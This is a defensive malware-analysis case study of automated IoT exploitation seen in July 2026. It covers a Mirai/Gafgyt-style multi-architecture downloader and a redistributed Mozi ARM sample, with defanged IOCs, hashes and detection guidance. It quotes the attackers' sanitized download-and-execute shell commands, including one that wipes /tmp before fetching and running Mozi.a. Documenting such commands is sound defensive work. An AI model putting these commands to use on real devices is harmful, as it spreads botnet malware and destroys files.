# Automated IoT Botnet Exploitation Attempts

## Mirai/Gafgyt-style payload delivery and continued distribution of a known Mozi sample

> **Status:** Infrastructure analysis, sandbox-based behavioral analysis and IOC
> correlation completed.

## Executive summary

This case study documents automated exploitation attempts observed against an
Internet-facing system in July 2026. The activity led to the identification of
two technically distinct malware-delivery clusters:

1. command-execution attempts that downloaded a shell script named
   `cumshotnews`, which subsequently retrieved Linux ELF payloads compiled for
   numerous CPU architectures;
2. command-injection attempts that downloaded and tried to execute a known
   32-bit ARM ELF named `Mozi.a`.

The first cluster is consistent with the contemporary Mirai/Gafgyt ecosystem:
automated exploitation, short shell downloaders, multi-architecture payload
sets, and binaries disguised as ordinary Linux daemons. The second cluster
distributed a historical sample associated with Mozi.

The evidence confirms malware delivery and active distribution of a known Mozi
payload. It does **not** prove that both clusters were operated by the same
actor, that exploitation succeeded, or that the original Mozi botnet and its
operators returned.

All indicators in this public report are defanged. Organization-identifying
data, exact target details and raw telemetry have been intentionally excluded.

<img width="536" height="395" alt="High-level delivery chain" src="https://github.com/user-attachments/assets/99a3fceb-f0f2-40d3-8652-288adf47a57f" />


## Scope and methodology

The analysis used:

- decoded HTTP requests collected from security telemetry;
- controlled retrieval of publicly exposed payloads;
- sandbox reports and exported IOC data;
- cryptographic hashes for cross-source correlation;
- public threat-research sources describing Mirai, Gafgyt and Mozi;
- a controlled x86-64 Ubuntu environment for the initial Mozi execution test.

No malware sample is included in this repository.

### Confidence language

| Confidence | Meaning in this report |
|---|---|
| High | Directly supported by captured commands, retrieved files or matching hashes |
| Moderate | Supported by sandbox behavior and multiple external sources, but not independently confirmed through code analysis |
| Low / hypothesis | Plausible explanation that requires more telemetry or code analysis |

## Cluster A: multi-architecture Mirai/Gafgyt-style delivery

### Initial command execution

Two RCE patterns attempted to run substantially similar shell commands:

- a ThinkPHP-style request using `call_user_func_array` and `system`;
- a GeoServer WFS request using `GetPropertyValue` and
  `java.lang.Runtime.getRuntime()`.

A sanitized representation of the decoded command is shown below:

```bash
chmod +x /usr/bin/curl
chmod +x /usr/bin/wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget -q --tries=3 --timeout=10 -O cumshotnews http://[PAYLOAD-HOST]/cumshotnews \
  || curl -fsSL --connect-timeout 10 -o cumshotnews http://[PAYLOAD-HOST]/cumshotnews
chmod 777 cumshotnews
sh cumshotnews
rm -f cumshotnews
```

The command:

1. makes sure `curl` and `wget` can be executed;
2. searches several commonly writable directories;
3. downloads the first-stage shell script;
4. executes it;
5. deletes the downloader.

The use of more than one exploitation path with the same delivery logic is
consistent with automated, opportunistic scanning rather than carefully
targeted intrusion activity.

<img width="590" height="501" alt="Decoded ThinkPHP exploitation request" src="https://github.com/user-attachments/assets/fb486874-8109-48c1-80d0-9064eab4ee34" />
<img width="2057" height="920" alt="GeoServer payload decoded with CyberChef" src="https://github.com/user-attachments/assets/05bb7932-db84-4252-bc2e-4890f9ec675b" />
<img width="1279" height="151" alt="GeoServer payload decoded with CyberChef" src="https://github.com/user-attachments/assets/bf5ff864-d159-4c6a-8207-4ab637039e59" />

### Downloader behavior

Sandbox telemetry for `cumshotnews` showed the creation of payloads using the
`ohshit.<architecture>` naming convention. The observed set covered:

- x86 and i686;
- x86-64;
- MIPS and MIPSEL;
- ARM, ARM5, ARM6 and ARM7;
- ARC;
- SPARC;
- M68K;
- SH4;
- PowerPC.

This breadth is typical of IoT malware distribution: one shell script attempts
multiple binaries so that at least one matches the victim's processor.

<img width="1718" height="860" alt="Multi-architecture payload downloader" src="https://github.com/user-attachments/assets/6b335be7-a2dc-49ed-834d-98c73e967f64" />


### Payload-hosting infrastructure

An exposed HTTP directory contained folders named after legitimate Linux and
embedded-system services, including:

`chronyd`, `crond`, `dhcpcd`, `dnsmasq`, `dropbear`, `httpd`, `init`, `ntpd`,
`sshd`, `syslogd`, `systemd`, `udevd`, `udhcpc` and `vsftpd`.

The same infrastructure also exposed artifacts named `cumshotnews`,
`routereater` and `bachekuni`. Naming malware after common daemons may help it
blend into a process list or filesystem during superficial inspection.

This conclusion concerns the naming strategy only. Persistence and process
masquerading still require confirmation through endpoint or reverse-engineering
evidence.

<img width="648" height="943" alt="Exposed payload-hosting directory" src="https://github.com/user-attachments/assets/62053e52-a66e-40bb-9237-f5cdf698122d" />
<img width="2262" height="1136" alt="Public infrastructure data observed in Censys" src="https://github.com/user-attachments/assets/7bddaaca-451b-45d4-84f2-024142de975d" />


### Hash correlation

One payload appeared under at least two different names:

| SHA-256 | Observed names |
|---|---|
| `5c299c0278faf2fb51febdde019a7f24ea147e6c968b688cb05f7cef4d4f76a0` | `ohshit.arm6`, `httpd` |

This demonstrates why filenames should not be used as stable malware
identifiers. Hashes and code-level similarity are more reliable for
correlation.

### Observed architecture-specific hashes

The following values were extracted from the supplied sandbox IOC export:

| Payload | SHA-256 |
|---|---|
| `ohshit.x86` | `8fb4cfabec6fa0b8f0e0d25135e87e88c13c3dce61c1335a89ee2e474a3d1570` |
| `ohshit.mips` | `e7889354c0d2cce6cc0c6a34ec13afd79bf361388e76ed2b3b987e0613d9c6a6` |
| `ohshit.arc` | `c1c1046c507058c0ca6d14bb5369a84a45791d58475ce12fc6995451f0c5eb14` |
| `ohshit.i686` | `c7e7d77602c121ebe2785d8e4068b7d459abe975ad9e3e8471ba28e9783b8dca` |
| `ohshit.x86_64` | `ee44fb0df1cf9740c5779bc5a811e4d1c984365fd5e0482434f58fc1cc54d638` |
| `ohshit.mpsl` | `5f85a860b374bb803aff4cc9e1d928b5ad3d678c0e252b45e7b88d3bed88b152` |
| `ohshit.arm` | `3bc7efeed4bbebc6a515be55736e6726dd3873553b00e70af513f8ab05761422` |
| `ohshit.arm5` | `850847440cf308046af0139b1c74e7059d19e82f591705f772d4568d854c1079` |
| `ohshit.arm6` | `5c299c0278faf2fb51febdde019a7f24ea147e6c968b688cb05f7cef4d4f76a0` |
| `ohshit.arm7` | `517164c29c0e178b1bb4613d3d5ceb552329c9596791624d8277f2dc5ba37c50` |
| `ohshit.spc` | `338b19ba5a4d15cca22d48c02c298064164d9db9654e7473880d12211f3cd185` |
| `ohshit.m68k` | `13f6c8dcecb6677e77680f2b75d82b17fcee135cc00b474bcff5d9c64a06e9bb` |
| `ohshit.sh4` | `f9191fbfcd25b4d0274e7831ae190d888c42be4e3794c4bb3dea7517b704fdee` |
| `ohshit.ppc` | `c0685aa4c68bbecb0bc5a61c3ee46eb9056ae33ded414784761d8ccac48e5bbd` |

These hashes are observations, not a guarantee that every file remains
available or malicious at the time this report is read.

## Cluster B: continued distribution of a known Mozi payload

### Observed propagation command

A separate request used the following structure:

```text
/shell?cd+/tmp;rm+-rf+*;wget+http://[NODE]:[HIGH-PORT]/Mozi.a;
chmod+777+Mozi.a;/tmp/Mozi.a+jaws
```

After decoding, it:

1. changes to `/tmp`;
2. removes existing files in that directory;
3. downloads `Mozi.a`;
4. grants broad executable permissions;
5. launches the binary with the argument `jaws`.

The command is destructive because `rm -rf *` removes files from the current
temporary directory. It should never be reproduced outside a disposable lab.

### Retrieved sample

| Property | Value |
|---|---|
| Filename | `Mozi.a` |
| SHA-256 | `12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef` |
| Size | 307,960 bytes |
| Format | ELF, 32-bit |
| Architecture | ARM |
| Linking | Statically linked |
| Symbols | Stripped |
| Execution argument | `jaws` |
| Family assessment | Mozi; overlapping vendor detections may reference Mirai |
| Confidence | High for sample identity; unconfirmed current botnet membership |

The sample was retrieved successfully, but execution in an x86-64 Ubuntu
environment returned:

```text
bash: /tmp/Mozi.a: cannot execute binary file: Exec format error
```

This is an architecture mismatch, not evidence that the sample is benign or
corrupt. The kernel could not run an ARM executable directly on an x86-64 CPU.
Consequently, that particular sandbox run did not show the sample's actual
network or process behavior.

### What the observation proves

The evidence supports the following statement:

> A previously known Mozi-associated ARM payload was still being actively
> distributed from an Internet host in July 2026.

It does not independently establish:

- that the original Mozi operators remain active;
- that the original P2P/DHT network has been restored;
- that the host serving the payload was a command-and-control server;
- that the observed host was knowingly operated by the attacker;
- that execution would result in successful enrollment into a live botnet.

The serving host may have been a compromised propagation node, a residual
infection, infrastructure controlled by another actor reusing the binary, or a
research system. The first explanation is plausible from the behavior, but it
remains an assessment rather than a proven attribution.

### Why products may label the same file as Mozi or Mirai

Mozi did not emerge in isolation. Research by 360 Netlab documented code and
functional relationships with earlier IoT malware, including Gafgyt and Mirai.
Security products may therefore assign overlapping family labels based on
shared code, scanner behavior, DDoS functions, strings or generic ELF
signatures.

For this reason, the report uses:

> **Mozi-associated ARM payload with Mirai-related detection overlap**

instead of treating a single antivirus label as definitive attribution.

## Relationship assessment

| Characteristic | Cluster A | Cluster B |
|---|---|---|
| Primary artifact | `cumshotnews`, `ohshit.*` | `Mozi.a` |
| Delivery | RCE followed by a shell downloader | `/shell` command injection |
| Architecture coverage | Broad multi-architecture set | Retrieved ARM sample |
| Hosting model observed | Central HTTP repositories | Host on a random high TCP port |
| Family assessment | Mirai/Gafgyt-style ecosystem | Known Mozi-associated payload |
| Direct link between clusters | Not established | Not established |

Both clusters targeted Linux-based and embedded devices, but similarity of the
victim class and shell utilities is not enough to attribute them to one
campaign. The defensible conclusion is that two IoT-malware delivery patterns
were observed during the same investigation.

## Detection opportunities

### Network and web telemetry

Prioritize combinations rather than isolated strings:

- `call_user_func_array` together with `system`;
- GeoServer `GetPropertyValue` together with `Runtime.getRuntime`;
- `/shell?cd+/tmp` followed by `wget` or `curl`;
- requests for `/Mozi.a`;
- the argument `jaws` near creation or execution of `Mozi.a`;
- downloads named `cumshotnews`, `routereater`, `ohshit.*`;
- repeated retrieval of ELF files with architecture suffixes;
- outbound HTTP to high, non-standard TCP ports immediately after an exploit.

### Endpoint telemetry

High-value behavioral sequences include:

```text
web server -> sh/bash -> wget/curl -> chmod -> ELF execution
```

and:

- ELF creation in `/tmp`, `/var/tmp`, `/var/run`, `/dev/shm` or `/mnt`;
- a web-facing service spawning `/bin/sh`, `bash`, `wget`, `curl` or `chmod`;
- a newly created ELF being deleted shortly after execution;
- executables using names such as `sshd`, `httpd`, `udevd` or `dnsmasq` from
  unexpected paths;
- one process attempting multiple architecture-specific payloads in sequence.

### Defensive actions

- patch exposed applications and appliances, including unsupported IoT devices;
- restrict administrative interfaces from the public Internet;
- prevent web-service accounts from writing and executing in temporary paths;
- apply egress controls to embedded-device and management networks;
- alert on web processes spawning shells or download utilities;
- segment IoT devices from user, server and management networks;
- rotate default credentials and disable unused Telnet/SSH services;
- preserve HTTP, DNS, process and file telemetry long enough to reconstruct the
  complete chain.

## Indicators of compromise

### Network indicators

| Indicator | Observed role |
|---|---|
| `192.142.28[.]77` | First-stage `cumshotnews` hosting |
| `166.0.192[.]57` | `cumshotnews` and multi-architecture payload hosting |
| `cremin.tropixa[.]online` | `routereater` hosting observed in sandbox data |
| `blanda.tropixa[.]online` | `httpd` repository observed in sandbox data |
| `www.tropixa[.]online` | Multi-directory payload repository |
| `www.bluekp[.]com` | Multi-directory payload repository |
| `59.53.122[.]214:34269` | Host serving the observed `Mozi.a` sample |

Infrastructure indicators are time-sensitive and may later be reassigned,
cleaned or used for benign purposes. Validate them before blocking and prefer
behavioral detections where possible.

### Key file indicators

| Artifact | SHA-256 |
|---|---|
| `Mozi.a` | `12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef` |
| `ohshit.arm6` / `httpd` | `5c299c0278faf2fb51febdde019a7f24ea147e6c968b688cb05f7cef4d4f76a0` |

## Sandbox-based behavioral analysis

No independent reverse engineering of the malware binaries was performed.
Behavioral conclusions in this report are based on sandbox telemetry, IOC
exports, cryptographic-hash correlation and publicly available threat
research.

This approach was sufficient to reconstruct the delivery chain and document
observable behavior, but it does not provide the same level of certainty as
manual code analysis.

### Evidence extracted from sandbox reports

| Evidence category | Observation | Assessment |
|---|---|---|
| Process and command activity | `wget`, `curl`, `chmod` and shell execution were used to retrieve and launch payloads | Directly observed delivery behavior |
| Created files | `cumshotnews` created multiple `ohshit.<architecture>` files | Multi-architecture IoT payload distribution |
| File correlation | The same SHA-256 appeared as both `ohshit.arm6` and `httpd` | Filename changes were used and filenames were not reliable identifiers |
| Network activity | Payloads were retrieved from exposed HTTP repositories and non-standard ports | Active malware-hosting or propagation infrastructure |
| Mozi execution attempt | `Mozi.a` was downloaded and launched with the argument `jaws` | Directly observed propagation command |
| Execution result | The operating system returned `Exec format error` | ARM payload could not execute in the x86-64 environment |
| External classification | Public services associated the retrieved hash with Mozi and overlapping Mirai detections | Supporting family identification, not sole attribution evidence |

### Interpretation rules

The following distinctions were maintained throughout the analysis:

- a downloaded file does not prove successful execution;
- a sandbox family label does not by itself prove attribution;
- an unavailable behavior may result from sandbox limitations rather than an
  inactive malware function;
- source IP addresses may belong to compromised propagation nodes;
- historical malware can still be redistributed by unrelated operators;
- matching behavior across two clusters does not prove a common operator.

The report therefore focuses on behavior that was directly visible in the
sandbox results and clearly separates those observations from assessments based
on external research.

## Limitations

- No independent reverse engineering of the malware binaries was performed.
- The initial dynamic attempt used an incompatible x86-64 environment.
- Sandbox visibility depended on the selected operating system, architecture,
  execution time and simulated network environment.
- Public sandbox verdicts and family names are supporting evidence, not a
  substitute for manual code analysis.
- Behaviors described in general Mozi or Mirai research were not attributed to
  these exact samples unless they were visible in the supplied reports.
- Successful exploitation of the original target was not established in the
  public dataset.
- Source IP addresses may represent compromised devices rather than operators.
- Open directories and public reports are volatile and may disappear.
- The IOC JSON exports include unrelated browser traffic; only artifacts
  correlated with the investigated chain were retained here.
- No evidence currently links Cluster A and Cluster B to the same operator.

## Conclusion

The investigation identified two active IoT-malware delivery patterns. The
first used application RCE and a short shell downloader to distribute Linux ELF
payloads across a wide range of processor architectures. The second distributed
a known Mozi-associated ARM sample from a host using a high TCP port.

The Mozi observation is notable because a payload first reported years earlier
was still retrievable in 2026. The safest interpretation is continued
distribution or reuse of historical Mozi malware, not proof that the original
Mozi operation has returned.

This case study should therefore be treated as an analysis of delivery
infrastructure, observable sandbox behavior and IOC relationships rather than a
full reverse-engineering report.

## References

### Case-specific analysis

- [ANY.RUN - retrieved Mozi sample attempt](https://any.run/report/4ae63def9b6b7aec45dd8221d5a3b933af7d55d2008518df438796f0d78b9e65/7f2ae3b1-8a3d-4031-b77b-4ab8421c2880)
- [VirusTotal - Mozi sample SHA-256](https://www.virustotal.com/gui/file/12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef)
- [MalwareBazaar - Mozi sample record](https://bazaar.abuse.ch/sample/12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef/)
- [ANY.RUN - multi-architecture payload report 1](https://any.run/report/9d318f174b34f19a350fb6d3be49c71ba4925b6ca078a4cbaa483b80cb51eff3/d045ec65-e493-43f3-b87c-793f47ec83c7)
- [ANY.RUN - multi-architecture payload report 2](https://any.run/report/888503847dde82d662d053eb608dc58fbccf7f4f04e7aed2af69db7e51baf450/d886a0f5-e354-42d5-9104-3cfc43e02d5f)
- [ANY.RUN - multi-architecture payload report 3](https://any.run/report/50b01d33542e9a7b7ca055a5c9b3fc6eec6a51d2f854180d46df6d6f09f58bcd/9b49973d-09ee-4848-94de-dc21b89a6655)

### Technical background

- [360 Netlab - Mozi, Another Botnet Using DHT](https://blog.netlab.360.com/mozi-another-botnet-using-dht/)
- [Elastic Security Labs - Collecting and operationalizing threat data from the Mozi botnet](https://www.elastic.co/security-labs/collecting-and-operationalizing-threat-data-from-the-mozi-botnet)
- [ESET Research - Who killed Mozi?](https://www.welivesecurity.com/en/eset-research/who-killed-mozi-finally-putting-the-iot-zombie-botnet-in-its-grave/)
- [Akamai SIRT - Mirai exploitation of GeoVision IoT devices](https://www.akamai.com/blog/security-research/active-exploitation-mirai-geovision-iot-botnet)
- [Akamai SIRT - Mirai spreads through a Wazuh vulnerability](https://www.akamai.com/blog/security-research/botnets-flaw-mirai-spreads-through-wazuh-vulnerability)

## Disclaimer

This publication was prepared for educational, research, and professional-development purposes. It presents technical observations, methods, and conclusions based on materials available at the time of analysis.

It does not contain personal data, credentials, private communications, internal telemetry, confidential or proprietary information, or organization-specific infrastructure details. Any sensitive contextual details have been omitted or anonymized. Public technical indicators are included only where relevant and are defanged when appropriate.

Unless explicitly stated otherwise, this publication does not identify the source, owner, affected entity, or circumstances in which the analyzed material was obtained or observed. The findings reflect the available evidence and the scope defined for the analysis.
